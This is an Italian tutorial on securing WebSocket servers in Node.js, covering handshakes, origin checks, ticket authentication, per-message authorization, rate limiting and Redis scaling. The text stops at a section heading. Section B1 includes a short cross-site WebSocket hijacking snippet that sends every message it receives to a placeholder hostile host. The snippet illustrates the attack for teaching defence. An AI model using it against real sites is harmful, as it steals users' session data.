# Tutorial 23 — WebSocket e Sicurezza del Real-Time: Dal Principiante all'Esperto

> **Companion a:** `23-websocket-security.md`
> **Scope:** handshake HTTP Upgrade e framing · opcode e close code · heartbeat · CSWSH e origin check · le quattro strategie di autenticazione · autorizzazione per messaggio · rate limiting su canale persistente · limiti anti-DoS · scaling con sticky session e Redis pub/sub · riconnessione e stato · backpressure e draining
> **Prerequisiti:** `tutorial_10_nodejs.md`, `tutorial_13_autenticazione_autorizzazione.md`, `tutorial_14_sicurezza_web.md`, `tutorial_22_rate_limiting_edge.md` — sai scrivere un server Node, gestire sessioni e token, e limitare il traffico
> **Durata stimata:** 5-7 ore di studio + esercizi
> **Lingua:** Italiano — termini tecnici in inglese preservati
> **Stack:** RFC 6455 · RFC 7692 · `ws` 8 · Socket.IO 4 · Redis 7 · Node.js 22

---

## Indice Generale

- **[Parte A — Basi Assolute](#parte-a--basi-assolute)**
  - [A1. Perché esiste una connessione persistente](#a1-perché-esiste-una-connessione-persistente)
  - [A2. L'handshake: come nasce un WebSocket](#a2-lhandshake-come-nasce-un-websocket)
  - [A3. Frame, opcode e close code](#a3-frame-opcode-e-close-code)
  - [A4. Il primo server, e cosa gli manca](#a4-il-primo-server-e-cosa-gli-manca)
  - [A5. Heartbeat: la connessione che sembra viva](#a5-heartbeat-la-connessione-che-sembra-viva)
- **[Parte B — Comprensione Profonda](#parte-b--comprensione-profonda)**
  - [B1. CSWSH: l'attacco che HTTP non conosce](#b1-cswsh-lattacco-che-http-non-conosce)
  - [B2. Autenticare: quattro strategie, una scelta](#b2-autenticare-quattro-strategie-una-scelta)
  - [B3. Il token che scade a connessione aperta](#b3-il-token-che-scade-a-connessione-aperta)
  - [B4. Autorizzare ogni messaggio, non la connessione](#b4-autorizzare-ogni-messaggio-non-la-connessione)
  - [B5. Rate limiting su un canale persistente](#b5-rate-limiting-su-un-canale-persistente)
  - [B6. I limiti che vanno messi prima di aprire](#b6-i-limiti-che-vanno-messi-prima-di-aprire)
  - [B7. Scalare: sticky session e Redis pub/sub](#b7-scalare-sticky-session-e-redis-pubsub)
  - [B8. Riconnessione: il messaggio perso nel mezzo](#b8-riconnessione-il-messaggio-perso-nel-mezzo)
  - [B9. Backpressure e chiusura ordinata](#b9-backpressure-e-chiusura-ordinata)
- **[Parte C — Esercizi Pratici Guidati](#parte-c--esercizi-pratici-guidati)**
  - [C1. Esercizi progressivi con soluzione](#c1-esercizi-progressivi-con-soluzione)
  - [C2. Mini-progetto: la chat del portale](#c2-mini-progetto-la-chat-del-portale)
- **[Parte D — Approfondimento per Esperti](#parte-d--approfondimento-per-esperti)**
  - [D1. Testare il real-time](#d1-testare-il-real-time)
  - [D2. WebSocket, SSE o polling](#d2-websocket-sse-o-polling)
  - [D3. Osservare una connessione persistente](#d3-osservare-una-connessione-persistente)
  - [D4. Il deploy che non butta giù tutti](#d4-il-deploy-che-non-butta-giù-tutti)
  - [D5. Quando NON servono i WebSocket](#d5-quando-non-servono-i-websocket)
- **[Parte E — Riepilogo, Checklist e Prossimi Passi](#parte-e--riepilogo-checklist-e-prossimi-passi)**

---

## Mappa concettuale

```
   CLIENT                                          SERVER
     │  GET /ws  Upgrade: websocket                   │
     │  Sec-WebSocket-Key: …                          │
     ├───────────────────────────────────────────────►│  ① origin check
     │                                                │  ② autenticazione
     │◄───────────────────────────────────────────────┤     101 Switching
     │                                                │
     │◄══════════ canale full-duplex ════════════════►│  ③ per OGNI messaggio
     │   frame: FIN · opcode · MASK · payload         │     schema, autorizzazione
     │◄─── ping ──── pong ───► (heartbeat, 30 s)      │     e rate limit
     └──── close 1000 / 1008 / 4001 ──────────────────┘

   LE TRE SUPERFICI CHE HTTP NON HA
     l'handshake ignora CORS → CSWSH · la connessione dura ore →
     il token scade dentro · il canale è aperto in entrata → un
     client può inondare
```

---

# Parte A — Basi Assolute

---

## A1. Perché esiste una connessione persistente

> **Analogia:** le cartoline e la telefonata. Con HTTP scrivi una cartolina, aspetti la risposta, ne scrivi un'altra: per sapere se è arrivata posta devi continuare a chiedere. Il WebSocket è una telefonata: la linea resta aperta e chiunque dei due può parlare quando ha qualcosa da dire.

```
IL PROBLEMA CHE RISOLVE — una notifica che deve arrivare in un secondo

  POLLING       una richiesta al secondo per utente: con 10.000
                utenti sono 10.000 richieste al secondo, e il 99,9%
                risponde "niente di nuovo"
  LONG POLLING  la richiesta resta aperta finché non c'è qualcosa:
                meglio, ma ogni notifica costa una connessione nuova
  WEBSOCKET     una connessione, aperta. Il server parla quando ha
                qualcosa da dire, e ogni messaggio costa due byte
                invece di ottocento.
```

Il WebSocket (RFC 6455) è full-duplex: entrambi i lati possono inviare in qualunque momento, sulla stessa connessione TCP. Non c'è richiesta e non c'è risposta — ci sono messaggi.

```
E IL PREZZO, che va detto prima dei vantaggi

  · lo STATO vive nel processo: quel client è legato a quel server,
    e lo scaling orizzontale diventa un problema (§B7)
  · la connessione dura ORE: il token scade dentro, e la sessione
    revocata non se ne accorge (§B3)
  · il canale è aperto anche in ENTRATA: un client può mandare
    diecimila messaggi al secondo, e nessun load balancer lo ferma
    per te (§B5)
  · non c'è CORS: il browser apre la connessione verso qualunque
    origine, e il server si difende da solo (§B1)

⚠ TRE DEI QUATTRO SONO PROBLEMI DI SICUREZZA CHE IN HTTP NON
  ESISTONO. Non perché HTTP sia più sicuro, ma perché il browser e
  l'infrastruttura ne coprono una parte al posto tuo.
```

---

## A2. L'handshake: come nasce un WebSocket

Una connessione WebSocket comincia come una normale richiesta HTTP. È una scelta di progetto: così attraversa i proxy e i firewall che capiscono solo HTTP.

```http
GET /ws/chat HTTP/1.1
Host: api.esempio.it
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Origin: https://app.esempio.it
```

```http
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

```
COSA SUCCEDE, IN ORDINE
  1. il client genera 16 byte casuali e li manda in base64 come
     `Sec-WebSocket-Key`
  2. il server li concatena a una stringa fissa definita nella RFC,
     ne calcola SHA-1 e rimanda il risultato in base64
  3. il client verifica la corrispondenza

⚠ QUESTO NON È UN MECCANISMO DI SICUREZZA, e viene scambiato per
  tale di continuo: la stringa è pubblica e la trasformazione è
  deterministica, quindi chiunque può calcolarla. Serve a garantire
  che dall'altra parte ci sia un vero server WebSocket, non un
  proxy che ha frainteso la richiesta.

➜ IL PUNTO IN CUI SI DECIDE CHI ENTRA È QUESTO HANDSHAKE, e la
  decisione la prende il TUO codice: origin (§B1) e autenticazione
  (§B2) vanno qui, prima che la connessione esista.
```

Due cose il browser non te le lascia fare. Non puoi mandare header custom — `new WebSocket(url, protocolli)` accetta solo l'URL e i sottoprotocolli, niente `Authorization: Bearer`, ed è la ragione per cui l'autenticazione WebSocket è un capitolo a sé (§B2). E non puoi leggere la risposta di un handshake fallito: il client vede un evento `error` generico, quindi il motivo va comunicato dopo l'apertura o nel close code (§A3).

---

## A3. Frame, opcode e close code

Dopo l'handshake non ci sono più richieste HTTP: ci sono frame binari.

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-------+-+-------------+-------------------------------+
|F|R|R|R| opcode|M| Payload len |    Extended payload length    |
|I|S|S|S|  (4)  |A|     (7)     |           (16/64)             |
|N|V|V|V|       |S|             |                               |
+-+-+-+-+-------+-+-------------+-------------------------------+
|             Masking-key, se MASK = 1 (32 bit)                 |
+---------------------------------------------------------------+
|                        Payload Data …                         |
+---------------------------------------------------------------+

  FIN      è l'ultimo frame del messaggio? Uno può essere spezzato
  RSV1-3   per le estensioni: `permessage-deflate` usa RSV1 per
           dire "questo frame è compresso"
  MASK     i frame CLIENT → SERVER vanno mascherati, gli altri no
```

⚠ Il masking non è crittografia — la chiave viaggia nel frame stesso. Serve contro il *cache poisoning* sui proxy: senza, un attaccante potrebbe far sì che i byte di un frame vengano interpretati da un proxy intermedio come una richiesta HTTP e finiscano nella sua cache.

| Opcode | Tipo | A cosa serve |
|---|---|---|
| `0x0` | Continuation | i frame successivi di un messaggio frammentato |
| `0x1` | Text | testo UTF-8 |
| `0x2` | Binary | dati binari |
| `0x8` | Close | richiesta di chiusura, con codice e motivo |
| `0x9` / `0xA` | Ping / Pong | heartbeat: chi riceve un Ping *deve* rispondere (§A5) |

```
I CLOSE CODE CHE SERVE CONOSCERE

  1000  chiusura normale · 1001 going away, il server si spegne
  1006  ANOMALA: la connessione è caduta senza frame di chiusura.
        Non lo manda nessuno, lo sintetizza la libreria — ed è
        quello che si vede nel 90% dei problemi reali
  1007  payload non conforme · 1008 policy violation, ed è quello
        dell'autenticazione fallita · 1009 messaggio troppo grande
  1011  errore interno · 1012 service restart, che dice al client
        "riconnettiti" (§D4) · 1013 try again later

  4000-4999  RISERVATI ALL'APPLICAZIONE. È qui che si mettono i
             motivi specifici, perché il client possa distinguerli.
```

```typescript
// I codici applicativi vanno definiti in un posto solo, e
// documentati per chi scrive il client: sono la sua unica fonte di
// informazione su perché è stato disconnesso.
export const CHIUSURA = {
  TOKEN_SCADUTO: 4001,      // il client deve rinnovare e riconnettersi
  LIMITE_SUPERATO: 4002,    // deve rallentare, non riconnettersi subito
  CANALE_NON_VALIDO: 4003,
  SESSIONE_DUPLICATA: 4004, // ha aperto una seconda scheda
} as const
```

⚠ Il motivo (`reason`) ha un limite di 123 byte — è un control frame, e la RFC lo impone. Una stringa più lunga fa fallire la chiusura.

---

## A4. Il primo server, e cosa gli manca

```typescript
// Il server che si trova in ogni tutorial introduttivo. Funziona, e
// non va messo in produzione: i cinque difetti sono nei commenti.
import { WebSocketServer } from 'ws'

const wss = new WebSocketServer({ port: 8080 })

wss.on('connection', (ws) => {
  ws.on('message', (dati) => {
    const messaggio = JSON.parse(dati.toString())
    for (const client of wss.clients) {
      client.send(JSON.stringify({ da: messaggio.da, testo: messaggio.testo }))
    }
  })
})
```

```
❌ NESSUN CONTROLLO DELL'ORIGIN — qualunque sito apre questa
   connessione dal browser di un tuo utente (§B1)
❌ NESSUNA AUTENTICAZIONE — chi si connette è chiunque
❌ `messaggio.da` VIENE DAL CLIENT — chi vuole scrive `da: "admin"`
❌ `JSON.parse` SENZA PROTEZIONE — un messaggio non-JSON solleva
   un'eccezione e porta giù il processo
❌ NESSUN LIMITE — né di dimensione, né di frequenza, né di
   connessioni per IP (§B5, §B6)
```

```typescript
// La correzione parte da `noServer: true`: si gestisce l'upgrade a
// mano, che è l'unico modo per decidere PRIMA che la connessione
// esista. Chi viene rifiutato qui non arriva mai a `connection`.
const wss = new WebSocketServer({ noServer: true, maxPayload: 64 * 1024 })

server.on('upgrade', async (richiesta, socket, testa) => {
  const rifiuta = (stato: string) => {
    socket.write(`HTTP/1.1 ${stato}\r\n\r\n`)
    socket.destroy()
  }

  // ① L'origin, prima di tutto: è la difesa contro il CSWSH (§B1)
  const origine = richiesta.headers.origin
  if (!origine || !ORIGINI_AMMESSE.has(origine)) return rifiuta('403 Forbidden')

  // ② L'identità, prima che la connessione esista
  const utente = await autenticaHandshake(richiesta)
  if (!utente) return rifiuta('401 Unauthorized')

  wss.handleUpgrade(richiesta, socket, testa, (ws) => {
    // I dati dell'identità stanno sulla CONNESSIONE, non nei
    // messaggi: è la differenza fra questo e il server di sopra
    Object.assign(ws, { utenteId: utente.id, ruolo: utente.ruolo })
    wss.emit('connection', ws, richiesta)
  })
})
```

Il gestore dei messaggi segue lo stesso principio: `JSON.parse` dentro un `try` — senza, un messaggio malformato fa uscire un'eccezione da un gestore di evento e porta giù il processo — validazione con uno schema, e il mittente preso da `ws.utenteId`, mai dal corpo. La forma completa è nell'Esercizio 1.

---

## A5. Heartbeat: la connessione che sembra viva

> **Analogia:** una telefonata dove l'altro è uscito dalla stanza senza riagganciare. La linea risulta aperta, tu parli, e nessuno ti sente. L'unico modo di accorgersene è dire "ci sei?" ogni tanto.

```
IL PROBLEMA: la connessione HALF-OPEN. Il client cade — il portatile
si chiude, il treno entra in galleria, un NAT dimentica la sessione —
e non arriva nessun frame di chiusura, quindi il server continua a
credere che quella connessione sia viva. Le connessioni morte si
accumulano finché il processo esaurisce i file descriptor, i
messaggi per quel client riempiono il buffer (§B9), e l'elenco dei
presenti mostra gente che non c'è.

➜ TCP DA SOLO NON LO RILEVA in tempo utile: il keepalive predefinito
  di Linux scatta dopo DUE ORE.
```

```typescript
// Il pattern canonico: si marca ogni connessione viva quando arriva
// il pong, e ogni trenta secondi si chiude chi non ha risposto.
const INTERVALLO_MS = 30_000

function avviaHeartbeat(wss: WebSocketServer): NodeJS.Timeout {
  const timer = setInterval(() => {
    for (const client of wss.clients) {
      const ws = client as WebSocket & { viva?: boolean }

      if (ws.viva === false) {
        // Non ha risposto al ping precedente: è morta. `terminate`
        // chiude subito, senza il round trip di `close`
        ws.terminate()
        continue
      }
      ws.viva = false
      ws.ping()
    }
  }, INTERVALLO_MS)

  timer.unref()
  return timer
}

wss.on('connection', (ws: WebSocket & { viva?: boolean }) => {
  ws.viva = true
  // Il pong lo manda il BROWSER, automaticamente: non serve codice
  // lato client, ed è il motivo per cui questo funziona sempre
  ws.on('pong', () => { ws.viva = true })
})
```

```
⚠ TRE DETTAGLI CHE FANNO LA DIFFERENZA
  1. IL TIMER VA FERMATO alla chiusura del server, altrimenti nei
     test resta un handle aperto e la suite non termina
  2. IL PING TIENE ANCHE VIVA LA CONNESSIONE: molti proxy chiudono
     quelle inattive dopo 60 secondi, e 30 sta sotto la soglia
     abituale — da verificare contro la configurazione vera
  3. IL CLIENT DEVE AVERE IL PROPRIO TIMEOUT: se è il server a
     cadere, se ne accorge solo perché non riceve più nulla
```

---

# Parte B — Comprensione Profonda

---

## B1. CSWSH: l'attacco che HTTP non conosce

```
IL FATTO DA CUI NASCE TUTTO: LA SAME-ORIGIN POLICY NON SI APPLICA
AI WEBSOCKET. Il browser lascia che qualunque pagina apra una
connessione verso qualunque host, e ci allega i cookie di quel
dominio come farebbe il sito legittimo. Niente preflight, niente
`Access-Control-Allow-Origin` da rispettare: il server riceve
l'header `Origin`, e sta a lui guardarlo.

➜ È IL CROSS-SITE WEBSOCKET HIJACKING. Un CSRF che, invece di una
  singola richiesta, regala all'attaccante un canale bidirezionale
  aperto: legge tutto ciò che il server manda e scrive come
  l'utente, per tutta la durata della sessione.
```

```javascript
// L'attacco, in tre righe, su una pagina qualunque
// L'utente è autenticato su app.esempio.it e visita sito-ostile.it
const ws = new WebSocket('wss://app.esempio.it/ws')
// I cookie di app.esempio.it partono da soli. Se il server si fida
// del cookie e non guarda l'Origin, la connessione è aperta.
ws.onmessage = (e) => fetch('https://sito-ostile.it/raccogli', {
  method: 'POST',
  body: e.data,
})
```

```typescript
// LA DIFESA — l'origin si controlla nell'handshake, con una lista
// di permesso esatta.
function origineAmmessa(richiesta: IncomingMessage): boolean {
  const origine = richiesta.headers.origin

  // ⚠ L'ORIGIN ASSENTE È UNA DECISIONE, non un caso da ignorare: i
  //   browser lo mandano SEMPRE, i client non-browser mai. Per un
  //   servizio solo-browser, assente significa rifiutare.
  if (!origine) return false

  // Confronto ESATTO contro una lista chiusa: `startsWith` farebbe
  // passare https://app.esempio.it.sito-ostile.it
  return ORIGINI_AMMESSE.has(origine)
}
```

```
⚠ L'ORIGIN DA SOLO NON BASTA SE L'AUTENTICAZIONE È VIA COOKIE. È
  un header, e un client non-browser lo scrive come vuole: ferma
  l'attacco dal browser di un utente ignaro, che è il vettore vero,
  ma non un attaccante che parla direttamente col server.

  ➜ LA DIFESA COMPLETA, in ordine: origin check con lista chiusa ·
    `SameSite=Strict` sul cookie, che impedisce al browser di
    allegarlo a una connessione cross-site · e meglio ancora, NON
    autenticare via cookie — un ticket monouso (§B2) non viene
    allegato automaticamente da nessuno.
```

Il terzo punto è quello che risolve invece di gestire: se l'handshake richiede un valore che il browser non manda da solo, il CSWSH non è più possibile per costruzione.

---

## B2. Autenticare: quattro strategie, una scelta

Il vincolo è quello del §A2: dal browser non puoi mandare header custom nell'handshake. Da lì nascono quattro approcci.

```
1. TOKEN NELL'URL     wss://api.esempio.it/ws?token=eyJ…
   ✅ semplice, e la verifica avviene prima di aprire
   ❌ l'URL finisce negli access log, nella cronologia e nei log dei
      proxy: un token che vale un'ora, in chiaro per un anno

2. TOKEN NEL PRIMO MESSAGGIO
   ✅ niente token nei log
   ❌ la connessione TCP esiste PRIMA dell'autenticazione: chi non
      si autentica occupa comunque un posto, e serve un timer che
      lo butti fuori (§B6)

3. COOKIE DI SESSIONE
   ✅ nessun token da gestire: c'è già
   ❌ è ciò che rende possibile il CSWSH (§B1): va bene SOLO con
      origin check e `SameSite=Strict`, ed è la strada che chiede
      più attenzione a chi la mantiene dopo di te

4. TICKET MONOUSO ◄── la scelta predefinita
   Il client chiede un ticket via HTTP normale, autenticato come
   sempre; vale trenta secondi, una volta sola, e serve solo per
   l'handshake.
   ✅ non è allegato automaticamente da nessuno: niente CSWSH
   ✅ se finisce in un log, è già scaduto, e la verifica avviene
      prima di aprire la connessione
   ❌ un giro HTTP in più, e uno store per i ticket
```

```typescript
// Passo 1 — l'emissione, su una rotta HTTP autenticata come le
// altre. Redis invece di una Map: con più istanze il ticket può
// essere emesso da un processo e speso su un altro (§B7), e il TTL
// fa da scadenza senza codice di pulizia.
import { randomBytes } from 'node:crypto'

const DURATA_TICKET_MS = 30_000

app.post('/api/ws-ticket', autenticato, async (req, res) => {
  const ticket = randomBytes(32).toString('base64url')
  await redis.set(
    `ws:ticket:${ticket}`,
    JSON.stringify({ utenteId: req.utente.id, ruolo: req.utente.ruolo }),
    'PX',
    DURATA_TICKET_MS,
  )
  res.json({ ticket, scadeTra: DURATA_TICKET_MS / 1000 })
})
```

```typescript
// Passo 2 — il consumo, nell'handshake. `GETDEL` è atomico: due
// handshake simultanei con lo stesso ticket non possono riuscire
// entrambi.
export async function autenticaHandshake(
  richiesta: IncomingMessage,
): Promise<{ id: string; ruolo: string } | null> {
  const url = new URL(richiesta.url ?? '/', `http://${richiesta.headers.host}`)
  const ticket = url.searchParams.get('ticket')
  if (!ticket) return null

  const grezzo = await redis.getdel(`ws:ticket:${ticket}`)
  if (!grezzo) return null

  const { utenteId, ruolo } = JSON.parse(grezzo)
  return { id: utenteId, ruolo }
}
```

⚠ Il ticket va nell'URL, come il token della prima strategia — e finisce nei log allo stesso modo. La differenza è che dopo trenta secondi, e dopo il primo uso, non vale più niente. È un segreto che scade prima di poter essere letto.

---

## B3. Il token che scade a connessione aperta

```
IL PROBLEMA CHE HTTP NON HA: una richiesta HTTP dura 200 ms, e il
token o è valido o non lo è. Una connessione WebSocket dura otto
ore, e nel mezzo succedono cose:

  · il token scade
  · l'utente cambia password, e le sessioni vanno revocate
  · un amministratore gli toglie un ruolo
  · l'account viene sospeso

⚠ SENZA UN MECCANISMO, quella connessione continua a funzionare con
  i permessi di quando è stata aperta. È il difetto di sicurezza
  più comune nelle applicazioni real-time, e non compare in nessun
  test perché i test durano secondi.
```

```typescript
// La connessione porta con sé la scadenza e la controlla a ogni
// messaggio: il costo è un confronto fra numeri.
interface Connessione extends WebSocket {
  utenteId: string
  ruolo: string
  scadenza: number // secondi Unix, dal token
}

function tokenValido(ws: Connessione): boolean {
  return ws.scadenza * 1000 > Date.now()
}

// In testa a ogni gestore di messaggio, e il codice applicativo dice
// al client COSA fare: rinnovare e riconnettersi, non riprovare a
// caso (§A3)
if (!tokenValido(ws)) ws.close(CHIUSURA.TOKEN_SCADUTO, 'token scaduto')
```

```typescript
// Il rinnovo senza riconnettere: il client manda il token nuovo
// sullo stesso canale, prima che il vecchio scada.
function gestisciRinnovo(ws: Connessione, messaggio: { token: string }): void {
  try {
    const nuovo = verificaToken(messaggio.token)

    // ⚠ IL TOKEN NUOVO DEVE APPARTENERE ALLO STESSO UTENTE. Senza
    //   questo controllo, chiunque abbia un token valido può
    //   prendere il posto di un altro su una connessione già
    //   aperta — un cambio d'identità a metà sessione.
    if (nuovo.sub !== ws.utenteId) {
      return ws.close(1008, 'il token non corrisponde alla connessione')
    }

    ws.scadenza = nuovo.exp
    ws.ruolo = nuovo.ruolo // i permessi possono essere cambiati
    ws.send(JSON.stringify({ tipo: 'rinnovo_ok', scadenza: nuovo.exp }))
  } catch {
    ws.close(CHIUSURA.TOKEN_SCADUTO, 'rinnovo non valido')
  }
}
```

Il server avvisa un minuto prima della scadenza con un messaggio `rinnova_token`, così il client ha il tempo di chiedere un token nuovo senza che la connessione cada.

⚠ Resta la revoca immediata, che la scadenza non copre: quando un utente cambia password o viene sospeso, le sue connessioni aperte vanno chiuse subito. Si pubblica l'evento su un canale Redis (§B7) e ogni istanza chiude le connessioni di quell'utente — senza, la finestra di esposizione è lunga quanto la vita del token.

---

## B4. Autorizzare ogni messaggio, non la connessione

Autenticare all'handshake dice *chi è*, non *cosa può fare* — e su un canale che dura ore la differenza è tutta lì.

```typescript
// ❌ SBAGLIATO — il classico "sei entrato, quindi puoi tutto":
//    `iscrivi(ws, messaggio.canale)` su QUALSIASI canale chiesto
// ✅ CORRETTO — ogni azione ha la sua verifica, e la verifica
//    interroga il database, non il messaggio
const REGOLE: Record<string, (ws: Connessione, risorsa: string) => Promise<boolean>> = {
  'progetto:*:leggi': (ws, id) => eMembro(ws.utenteId, id),
  'progetto:*:scrivi': (ws, id) => haRuolo(ws.utenteId, id, ['editor', 'admin']),
}

export async function autorizza(
  ws: Connessione,
  azione: string,
  risorsa: string,
): Promise<boolean> {
  if (!tokenValido(ws)) return false
  const regola = REGOLE[azione]
  return regola ? regola(ws, risorsa) : false
}
```

Il controllo avviene all'iscrizione e resta valido finché la connessione vive: se i permessi cambiano nel frattempo, l'iscrizione va tolta — è lo stesso problema della revoca del §B3. ⚠ E l'errore non deve distinguere "non esiste" da "non è tuo", che sarebbe enumerazione di risorse (tutorial_13 §B7): un solo codice `canale_non_disponibile` per entrambi i casi.

```
⚠ IL MESSAGGIO NON È MAI LA FONTE DELL'IDENTITÀ. Un `from`, un
  `userId`, un `role` dentro il corpo sono campi che il client ha
  scritto, e vanno IGNORATI — non validati, ignorati. L'identità
  sta sull'oggetto connessione, che l'ha ricevuta dall'handshake.

  ➜ Il modo di renderlo strutturale è che lo schema di validazione
    non contenga proprio quei campi: se lo schema è `.strict()`, un
    messaggio con `role` viene rifiutato invece che ripulito.
```

---

## B5. Rate limiting su un canale persistente

Il rate limiting del tutorial 22 conta le richieste HTTP. Qui non ci sono richieste: c'è una connessione aperta che può mandare quello che vuole, quanto vuole, senza passare da un load balancer.

```typescript
// Il contatore vive SULLA CONNESSIONE: niente Redis, niente rete.
// Con dieci messaggi al secondo per client, un round trip a Redis
// per messaggio costerebbe più del messaggio.
class LimiteConnessione {
  private momenti: number[] = []

  constructor(
    private readonly tetto: number,
    private readonly finestraMs: number,
  ) {}

  consenti(): boolean {
    const adesso = Date.now()
    // Il taglio in testa è O(k) sulle sole scadute, non O(n)
    while (this.momenti.length && this.momenti[0] < adesso - this.finestraMs) this.momenti.shift()

    if (this.momenti.length >= this.tetto) return false
    this.momenti.push(adesso)
    return true
  }
}
```

```typescript
// I limiti sono DIVERSI PER TIPO DI MESSAGGIO: un `typing` a venti
// al secondo è normale, un `messaggio` a venti al secondo è abuso.
const LIMITI: Record<string, { tetto: number; finestraMs: number }> = {
  messaggio: { tetto: 10, finestraMs: 10_000 },
  typing: { tetto: 30, finestraMs: 10_000 },
  rinnova_token: { tetto: 5, finestraMs: 60_000 },
}

function entroIlLimite(ws: Connessione, tipo: string): boolean {
  const regola = LIMITI[tipo]
  if (!regola) return false // un tipo sconosciuto non passa

  ws.limiti ??= new Map()
  let limite = ws.limiti.get(tipo)
  if (!limite) ws.limiti.set(tipo, (limite = new LimiteConnessione(regola.tetto, regola.finestraMs)))
  return limite.consenti()
}
```

```
LA RISPOSTA È GRADUATA, perché chiudere subito è sbagliato quasi
sempre: il caso più frequente non è l'abuso, è un client con un
ciclo che invia in loop.

  1ª volta ► si scarta il messaggio e si avvisa
  ripetuto ► si scarta in silenzio, per non alimentare il ciclo
  persistente ► si chiude con 4002, e il client sa che deve
      aspettare invece di riconnettersi subito

⚠ SERVE ANCHE UN LIMITE SUI BYTE, non solo sui messaggi: cento
  messaggi da 60 kB sono sei megabyte, e passano un limite espresso
  in messaggi al secondo senza toccarlo.
```

---

## B6. I limiti che vanno messi prima di aprire

```
LE CINQUE DIFESE ANTI-DoS, in ordine di quanto costa non averle

  1. maxPayload ► un frame da 100 MB è già in memoria prima che il
     tuo codice lo veda: va messo sulla libreria, non nel gestore
  2. connessioni per IP ► senza tetto, un client ne apre diecimila
     e finisce i file descriptor
  3. timeout di handshake ► una connessione aperta e mai
     autenticata costa quanto una autenticata
  4. limite globale ► quando il processo è pieno, le nuove vanno
     rifiutate con 1013 invece che accettate fino al crollo
  5. profondità del JSON ► `JSON.parse` su un oggetto annidato
     diecimila volte occupa la CPU per secondi
```

```typescript
// ① si dichiara alla creazione del server. ⚠ E la compressione si
// abilita solo se serve: ogni connessione con `permessage-deflate`
// porta con sé un contesto zlib da centinaia di kB, quindi con
// diecimila connessioni sono gigabyte di memoria spesi per
// risparmiare banda che non è il collo di bottiglia.
const wss = new WebSocketServer({
  noServer: true,
  maxPayload: 64 * 1024, // oltre questa soglia il frame chiude con 1009
  perMessageDeflate: false,
})

// ② ③ ④ nell'handshake, prima di accettare
const MAX_PER_IP = 10
const MAX_TOTALI = 10_000
const connessioniPerIp = new Map<string, number>()

server.on('upgrade', async (richiesta, socket, testa) => {
  const rifiuta = (stato: string) => {
    socket.write(`HTTP/1.1 ${stato}\r\n\r\n`)
    socket.destroy()
  }

  if (wss.clients.size >= MAX_TOTALI) return rifiuta('503 Service Unavailable')

  const ip = ipAffidabile(richiesta) // §22.A5: mai X-Forwarded-For grezzo
  if ((connessioniPerIp.get(ip) ?? 0) >= MAX_PER_IP) return rifiuta('429 Too Many Requests')
  // … origin e autenticazione, come nel §A4 …

  wss.handleUpgrade(richiesta, socket, testa, (ws) => {
    connessioniPerIp.set(ip, (connessioniPerIp.get(ip) ?? 0) + 1)

    // ⚠ IL DECREMENTO VA SU `close`, non su un percorso felice: se
    //   si dimentica, il contatore sale e basta, e dopo qualche ora
    //   nessuno si connette più senza che la causa sia ovvia
    ws.once('close', () => {
      const n = (connessioniPerIp.get(ip) ?? 1) - 1
      n <= 0 ? connessioniPerIp.delete(ip) : connessioniPerIp.set(ip, n)
    })

    wss.emit('connection', ws, richiesta)
  })
})
```

⚠ Il limite per IP va scelto sapendo che dietro un IP aziendale ci sono centinaia di persone (tutorial_22 §A5), e che una singola persona apre una connessione per scheda del browser. Dieci è ragionevole per un'applicazione normale; per una usata in ufficio va alzato, o legato all'utente invece che all'indirizzo.

---

## B7. Scalare: sticky session e Redis pub/sub

```
IL PROBLEMA, in una riga: una connessione vive in UN processo, e un
broadcast fatto lì non raggiunge i client connessi altrove.

   client A ─► Server 1 ── "ciao" ─► client B, stesso processo  ✅
   client C ─► Server 2 ── non lo riceve mai                    ❌
```

```
LE DUE COSE DA SISTEMARE, e sono distinte

  1. LE STICKY SESSION servono all'HANDSHAKE, non ai messaggi: con
     Socket.IO e il fallback in long-polling l'handshake è spezzato
     su più richieste HTTP che devono arrivare allo stesso processo.
     Con WebSocket puro servono meno, ma servono comunque se il
     server tiene stato in memoria.
  2. IL PUB/SUB serve ai MESSAGGI: ogni istanza si iscrive a un
     canale Redis e ripubblica ai propri client.

⚠ LE STICKY SESSION NON RISOLVONO IL BROADCAST, e questa confusione
  costa giorni: si configura `ip_hash` su Nginx, il problema resta,
  e non si capisce perché.
```

```nginx
# Le direttive che mancano quasi sempre: senza Upgrade e Connection
# il proxy tratta la richiesta come HTTP normale e l'handshake
# fallisce con 400. È il primo errore di ogni messa in produzione.
upstream websocket {
    ip_hash;
    server ws1.interno:8080;
    server ws2.interno:8080;
}

server {
    listen 443 ssl;
    location /ws {
        proxy_pass http://websocket;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;

        # Senza, il proxy chiude la connessione dopo 60 secondi e il
        # client vede un 1006 inspiegabile ogni minuto
        proxy_read_timeout 3600s;
    }
}
```

```typescript
// Il pub/sub a mano, quando non si usa Socket.IO. Servono DUE client
// Redis: una connessione in modalità subscribe non accetta altri
// comandi.
const pubblicatore = new Redis(process.env['REDIS_URL']!)
const sottoscrittore = pubblicatore.duplicate()
await sottoscrittore.psubscribe('canale:*')

sottoscrittore.on('pmessage', (_schema, canale, grezzo) => {
  const busta = JSON.parse(grezzo)

  // ⚠ SI SALTA L'ISTANZA CHE HA PUBBLICATO, altrimenti i suoi
  //   client ricevono il messaggio due volte: una in locale e una
  //   dal pub/sub.
  if (busta.origine === ID_ISTANZA) return

  for (const ws of iscrizioni.get(canale) ?? []) {
    ws.send(JSON.stringify(busta.messaggio))
  }
})

export async function trasmetti(canale: string, messaggio: unknown): Promise<void> {
  for (const ws of iscrizioni.get(canale) ?? []) ws.send(JSON.stringify(messaggio))
  await pubblicatore.publish(canale, JSON.stringify({ origine: ID_ISTANZA, messaggio }))
}
```

⚠ Il pub/sub di Redis non ha garanzie di consegna: è fire-and-forget, e se un'istanza è disconnessa nel momento della pubblicazione quel messaggio è perso senza che nessuno se ne accorga. Per la chat va bene — si recupera dallo storico alla riconnessione (§B8) — ma per un ordine o un pagamento no, e serve una coda con conferma: Redis Streams, o un broker con persistenza.

---

## B8. Riconnessione: il messaggio perso nel mezzo

